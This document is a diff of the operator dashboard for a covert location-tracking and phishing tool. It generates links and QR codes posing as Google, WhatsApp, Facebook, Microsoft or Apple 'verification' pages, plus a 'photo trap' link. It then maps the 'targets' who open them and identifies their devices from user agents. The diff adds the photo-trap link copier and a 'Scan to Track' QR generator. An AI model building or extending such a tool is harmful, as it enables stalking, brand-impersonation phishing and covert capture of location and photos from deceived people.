@@ -7,7 +7,6 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
-        /* ===== RESET & BASE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
@@ -20,7 +19,7 @@
         /* ===== TOP BAR ===== */
         #topBar {
             background: #1a1a2e;
-            padding: 10px 20px;
+            padding: 10px 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
@@ -36,7 +35,7 @@
             gap: 10px;
         }
         #topBar .brand h1 {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 700;
             background: linear-gradient(135deg, #e94560, #ff6b6b);
             -webkit-background-clip: text;
@@ -44,90 +43,157 @@
         }
         #topBar .brand .badge {
             background: #2a2a4a;
-            padding: 2px 10px;
+            padding: 2px 12px;
             border-radius: 20px;
             font-size: 11px;
             color: #4caf50;
         }
         #topBar .stats {
             display: flex;
-            gap: 18px;
-            font-size: 12px;
+            gap: 20px;
+            font-size: 13px;
         }
         #topBar .stats span { opacity: 0.6; }
         #topBar .stats strong { color: #fff; font-weight: 600; }
 
-        /* ===== LINK GENERATOR BAR ===== */
-        #linkBar {
+        /* ===== LINK GENERATOR PANEL ===== */
+        #linkPanel {
             background: #141425;
-            padding: 8px 20px;
+            padding: 12px 24px;
+            border-bottom: 1px solid #2a2a4a;
             display: flex;
             flex-wrap: wrap;
             align-items: center;
-            gap: 8px 12px;
-            border-bottom: 1px solid #2a2a4a;
+            gap: 10px 16px;
             z-index: 1000;
             position: relative;
         }
-        #linkBar label {
-            font-size: 12px;
-            opacity: 0.6;
+        #linkPanel .section {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-wrap: wrap;
         }
-        #linkBar select {
+        #linkPanel .section label {
+            font-size: 11px;
+            font-weight: 600;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        #linkPanel select {
             background: #0f0f1a;
             color: white;
             border: 1px solid #2a2a4a;
-            padding: 4px 10px;
+            padding: 4px 8px;
             border-radius: 4px;
             font-size: 12px;
             cursor: pointer;
         }
-        #linkBar select:hover { border-color: #4caf50; }
-        #linkBar .link-display {
+        #linkPanel select:hover { border-color: #4caf50; }
+        #linkPanel .link-display {
             background: #0f0f1a;
             padding: 4px 10px;
             border-radius: 4px;
             font-family: monospace;
             font-size: 11px;
             word-break: break-all;
-            flex: 1;
-            min-width: 150px;
             color: #4caf50;
             border: 1px solid #1e1e38;
+            min-width: 200px;
+            flex: 1;
         }
-        #linkBar .btn {
+        #linkPanel .btn {
             background: #4caf50;
             color: white;
             border: none;
-            padding: 4px 14px;
+            padding: 4px 12px;
             border-radius: 4px;
-            font-size: 12px;
+            font-size: 11px;
             cursor: pointer;
             font-weight: 600;
             transition: background 0.2s;
         }
-        #linkBar .btn:hover { background: #388e3c; }
-        #linkBar .btn-blue { background: #4285f4; }
-        #linkBar .btn-blue:hover { background: #3367d6; }
-        #linkBar .short-link {
+        #linkPanel .btn:hover { background: #388e3c; }
+        #linkPanel .btn-blue { background: #4285f4; }
+        #linkPanel .btn-blue:hover { background: #3367d6; }
+        #linkPanel .btn-qr { background: #ff9800; }
+        #linkPanel .btn-qr:hover { background: #e68900; }
+        #linkPanel .short-link {
             color: #ffc107;
-            font-size: 12px;
+            font-size: 11px;
             font-family: monospace;
             background: #0f0f1a;
             padding: 4px 10px;
             border-radius: 4px;
             border: 1px solid #1e1e38;
         }
-        #linkBar .divider {
+        #linkPanel .divider {
             width: 1px;
-            height: 24px;
+            height: 28px;
             background: #2a2a4a;
         }
+
+        /* QR Code Popup */
+        #qrPopup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        #qrPopup .popup-content {
+            background: #1a1a2e;
+            padding: 30px;
+            border-radius: 16px;
+            border: 1px solid #2a2a4a;
+            text-align: center;
+            max-width: 350px;
+            width: 90%;
+        }
+        #qrPopup .popup-content img {
+            max-width: 100%;
+            border-radius: 8px;
+            background: white;
+            padding: 10px;
+        }
+        #qrPopup .popup-content h3 {
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        #qrPopup .popup-content .close-btn {
+            margin-top: 15px;
+            padding: 8px 24px;
+            background: #e94560;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        #qrPopup .popup-content .close-btn:hover { background: #c62840; }
+        #qrPopup .popup-content .download-btn {
+            margin-top: 10px;
+            padding: 8px 24px;
+            background: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-left: 8px;
+        }
+        #qrPopup .popup-content .download-btn:hover { background: #388e3c; }
 
         /* ===== APP LAYOUT ===== */
         #app {
             display: flex;
-            height: calc(100vh - 120px);
+            height: calc(100vh - 130px);
             width: 100vw;
         }
 
@@ -256,7 +322,8 @@
             #app { flex-direction: column; }
             #mapContainer { height: 60%; }
             #topBar .stats { display: none; }
-            #linkBar .link-display { min-width: 100px; font-size: 10px; }
+            #linkPanel .link-display { min-width: 100px; font-size: 10px; }
+            #linkPanel { flex-direction: column; align-items: stretch; }
         }
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #0f0f1a; }
@@ -278,34 +345,64 @@
     </div>
 </div>
 
-<!-- ===== LINK GENERATOR BAR ===== -->
-<div id="linkBar">
-    <label>📤 Send:</label>
-    <select id="brandSelect">
-        <option value="google">🔵 Google</option>
-        <option value="whatsapp" selected>💬 WhatsApp</option>
-        <option value="facebook">🔷 Facebook</option>
-        <option value="microsoft">⬡ Microsoft</option>
-        <option value="apple"> Apple</option>
-    </select>
+<!-- ===== LINK GENERATOR PANEL ===== -->
+<div id="linkPanel">
+    <!-- Verification Link -->
+    <div class="section">
+        <label>📤 Verify</label>
+        <select id="brandSelect">
+            <option value="google">🔵 Google</option>
+            <option value="whatsapp" selected>💬 WhatsApp</option>
+            <option value="facebook">🔷 Facebook</option>
+            <option value="microsoft">⬡ Microsoft</option>
+            <option value="apple"> Apple</option>
+        </select>
+        <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
+        <button class="btn" id="copyLinkBtn">📋 Copy</button>
+        <span class="short-link" id="shortLinkDisplay">rebrand.ly/verify-wa</span>
+    </div>
 
     <div class="divider"></div>
 
-    <label>📸 Photo Trap:</label>
-    <select id="photoTemplateSelect">
-        <option value="google">🔵 Google</option>
-        <option value="whatsapp" selected>💬 WhatsApp</option>
-        <option value="facebook">🔷 Facebook</option>
-        <option value="microsoft">⬡ Microsoft</option>
-        <option value="apple"> Apple</option>
-    </select>
+    <!-- Photo Trap Link -->
+    <div class="section">
+        <label>📸 Photo</label>
+        <select id="photoTemplateSelect">
+            <option value="google">🔵 Google</option>
+            <option value="whatsapp" selected>💬 WhatsApp</option>
+            <option value="facebook">🔷 Facebook</option>
+            <option value="microsoft">⬡ Microsoft</option>
+            <option value="apple"> Apple</option>
+        </select>
+        <span class="link-display" id="photoLinkDisplay">https://location-tracker-cn7m.onrender.com/photo?template=whatsapp</span>
+        <button class="btn" id="copyPhotoLinkBtn">📋 Copy</button>
+    </div>
 
     <div class="divider"></div>
 
-    <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
-    <button class="btn" id="copyLinkBtn">📋 Copy</button>
+    <!-- QR Code Generator -->
+    <div class="section">
+        <label>📱 QR</label>
+        <select id="qrTemplateSelect">
+            <option value="google">🔵 Google</option>
+            <option value="whatsapp" selected>💬 WhatsApp</option>
+            <option value="facebook">🔷 Facebook</option>
+            <option value="microsoft">⬡ Microsoft</option>
+            <option value="apple"> Apple</option>
+        </select>
+        <button class="btn btn-qr" id="generateQrBtn">🔄 Generate QR</button>
+    </div>
+</div>
 
-    <span class="short-link" id="shortLinkDisplay">rebrand.ly/verify-wa</span>
+<!-- ===== QR CODE POPUP ===== -->
+<div id="qrPopup">
+    <div class="popup-content">
+        <h3>📱 Scan to Track</h3>
+        <img id="qrCodeImg" src="" alt="QR Code">
+        <br>
+        <button class="download-btn" id="downloadQrBtn">💾 Download QR</button>
+        <button class="close-btn" id="closeQrBtn">✕ Close</button>
+    </div>
 </div>
 
 <!-- ===== APP ===== -->
@@ -327,7 +424,7 @@
         <div id="emptyState">
             <div class="icon">🕵️</div>
             <div class="title">No targets yet</div>
-            <div class="sub">Send a link above to start tracking</div>
+            <div class="sub">Send a link or QR above to start tracking</div>
         </div>
     </div>
 </div>
@@ -352,10 +449,21 @@
     // =============================================
     const brandSelect = document.getElementById('brandSelect');
     const photoTemplateSelect = document.getElementById('photoTemplateSelect');
+    const qrTemplateSelect = document.getElementById('qrTemplateSelect');
     const linkDisplay = document.getElementById('linkDisplay');
     const shortLinkDisplay = document.getElementById('shortLinkDisplay');
     const copyLinkBtn = document.getElementById('copyLinkBtn');
+    const photoLinkDisplay = document.getElementById('photoLinkDisplay');
+    const copyPhotoLinkBtn = document.getElementById('copyPhotoLinkBtn');
+    const generateQrBtn = document.getElementById('generateQrBtn');
+    const qrPopup = document.getElementById('qrPopup');
+    const qrCodeImg = document.getElementById('qrCodeImg');
+    const downloadQrBtn = document.getElementById('downloadQrBtn');
+    const closeQrBtn = document.getElementById('closeQrBtn');
 
+    // =============================================
+    // UPDATE VERIFICATION LINK
+    // =============================================
     function updateLink() {
         const brand = brandSelect.value;
         const fullUrl = BASE_URL + '/?template=' + brand;
@@ -363,13 +471,12 @@
         linkDisplay.textContent = fullUrl;
         shortLinkDisplay.textContent = shortUrl;
     }
-
     brandSelect.addEventListener('change', updateLink);
-    photoTemplateSelect.addEventListener('change', function() {
-        // Update photo trap link if needed
-    });
     updateLink();
 
+    // =============================================
+    // COPY VERIFICATION LINK
+    // =============================================
     copyLinkBtn.addEventListener('click', function() {
         const link = linkDisplay.textContent;
         navigator.clipboard.writeText(link).then(() => {
@@ -393,6 +500,75 @@
     });
 
     // =============================================
+    // UPDATE PHOTO TRAP LINK
+    // =============================================
+    function updatePhotoLink() {
+        const template = photoTemplateSelect.value;
+        const url = BASE_URL + '/photo?template=' + template;
+        photoLinkDisplay.textContent = url;
+    }
+    photoTemplateSelect.addEventListener('change', updatePhotoLink);
+    updatePhotoLink();
+
+    // =============================================
+    // COPY PHOTO TRAP LINK
+    // =============================================
+    copyPhotoLinkBtn.addEventListener('click', function() {
+        const link = photoLinkDisplay.textContent;
+        navigator.clipboard.writeText(link).then(() => {
+            const originalText = copyPhotoLinkBtn.textContent;
+            copyPhotoLinkBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyPhotoLinkBtn.textContent = originalText;
+            }, 2000);
+        }).catch(() => {
+            const range = document.createRange();
+            range.selectNode(photoLinkDisplay);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            const originalText = copyPhotoLinkBtn.textContent;
+            copyPhotoLinkBtn.textContent = '✅ Copied!';
+            setTimeout(() => {
+                copyPhotoLinkBtn.textContent = originalText;
+            }, 2000);
+        });
+    });
+
+    // =============================================
+    // QR CODE GENERATOR
+    // =============================================
+    generateQrBtn.addEventListener('click', function() {
+        const template = qrTemplateSelect.value;
+        const url = BASE_URL + '/?template=' + template;
+        const qrApiUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(url);
+        qrCodeImg.src = qrApiUrl;
+        qrPopup.style.display = 'flex';
+    });
+
+    // =============================================
+    // DOWNLOAD QR CODE
+    // =============================================
+    downloadQrBtn.addEventListener('click', function() {
+        const link = document.createElement('a');
+        link.download = 'photo-trap-qr.png';
+        link.href = qrCodeImg.src;
+        link.click();
+    });
+
+    // =============================================
+    // CLOSE QR POPUP
+    // =============================================
+    closeQrBtn.addEventListener('click', function() {
+        qrPopup.style.display = 'none';
+    });
+    qrPopup.addEventListener('click', function(e) {
+        if (e.target === qrPopup) {
+            qrPopup.style.display = 'none';
+        }
+    });
+
+    // =============================================
     // MAP SETUP
     // =============================================
     const map = L.map('map', { zoomControl: false }).setView([51.505, -0.09], 13);
@@ -413,8 +589,6 @@
     function getDeviceModel(userAgent) {
         if (!userAgent) return 'Unknown Device';
         const ua = userAgent;
-
-        // --- iPhone ---
         if (ua.includes('iPhone')) {
             if (ua.includes('iPhone18,1')) return 'iPhone 17 Pro';
             if (ua.includes('iPhone18,2')) return 'iPhone 17 Pro Max';
@@ -452,8 +626,6 @@
             if (ua.includes('iPhone SE')) return 'iPhone SE';
             return 'iPhone';
         }
-
-        // --- Samsung Galaxy ---
         if (ua.includes('Samsung') || ua.includes('SM-')) {
             if (ua.includes('SM-S931')) return 'Samsung Galaxy S25';
             if (ua.includes('SM-S936')) return 'Samsung Galaxy S25+';
@@ -486,32 +658,22 @@
             if (ua.includes('SM-N981')) return 'Samsung Galaxy Note 20';
             return 'Samsung Galaxy';
         }
-
-        // --- Google Pixel ---
         if (ua.includes('Pixel')) {
             if (ua.includes('Pixel 9')) return 'Google Pixel 9';
             if (ua.includes('Pixel 8')) return 'Google Pixel 8';
             if (ua.includes('Pixel 7')) return 'Google Pixel 7';
             if (ua.includes('Pixel 6')) return 'Google Pixel 6';
-            if (ua.includes('Pixel 5')) return 'Google Pixel 5';
-            if (ua.includes('Pixel 4')) return 'Google Pixel 4';
             return 'Google Pixel';
         }
-
-        // --- Xiaomi / Redmi / POCO ---
         if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) {
             if (ua.includes('Xiaomi 14')) return 'Xiaomi 14';
             if (ua.includes('Xiaomi 13')) return 'Xiaomi 13';
-            if (ua.includes('Xiaomi 12')) return 'Xiaomi 12';
             if (ua.includes('Redmi Note 13')) return 'Redmi Note 13';
             if (ua.includes('Redmi Note 12')) return 'Redmi Note 12';
-            if (ua.includes('Redmi Note 11')) return 'Redmi Note 11';
             if (ua.includes('POCO X6')) return 'POCO X6';
             if (ua.includes('POCO F5')) return 'POCO F5';
             return 'Xiaomi';
         }
-
-        // --- OnePlus ---
         if (ua.includes('OnePlus')) {
             if (ua.includes('OnePlus 12')) return 'OnePlus 12';
             if (ua.includes('OnePlus 11')) return 'OnePlus 11';
@@ -519,13 +681,10 @@
             if (ua.includes('OnePlus 9')) return 'OnePlus 9';
             return 'OnePlus';
         }
-
-        // --- Other Android ---
         if (ua.includes('Android')) {
             const ver = ua.match(/Android\s([\d.]+)/);
             return 'Android ' + (ver ? ver[1] : '');
         }
-
         if (ua.includes('Windows')) return 'Windows PC';
         if (ua.includes('Mac')) return 'Mac';
         return 'Unknown Device';
@@ -741,12 +900,12 @@
     setInterval(fetchUsers, 3000);
     fetchUsers();
 
-    // Handle resize
     window.addEventListener('resize', () => setTimeout(() => map.invalidateSize(), 200));
     setTimeout(() => map.invalidateSize(), 500);
 
     console.log('📍 Dashboard initialized');
-    console.log('🔗 Links available in the bar above');
+    console.log('🔗 Links available in the panel above');
+    console.log('📱 QR code generator ready');
 </script>
 </body>
 </html>
